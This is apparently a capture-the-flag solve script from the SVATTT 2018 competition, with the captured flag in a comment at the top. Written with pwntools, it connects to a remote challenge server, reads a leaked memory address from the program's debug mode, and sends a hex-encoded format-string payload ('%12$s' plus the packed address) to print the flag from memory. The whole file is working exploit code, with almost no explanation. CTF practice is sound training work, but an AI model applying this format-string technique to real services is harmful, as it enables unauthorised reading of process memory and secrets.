#SVATTT2018{S0me0ne Behind Y0u}
from pwn import *
# Bug format string

#r = process("./Encoder")
r = remote("171.244.141.82", 4001)
r.recvuntil("Your choice:")
r.sendline("4")
r.recvuntil("Debug mode is enabled.\n ")
Flag = int(r.recvline().strip(), 16)
log.info("Flag: %#x" %Flag)

r.recvuntil("Your choice:")
r.sendline("2")
payload = "%12$s"
raw_input("?")
r.sendline(payload.encode('hex').ljust(16, "\x00") + p64(Flag))

r.interactive()
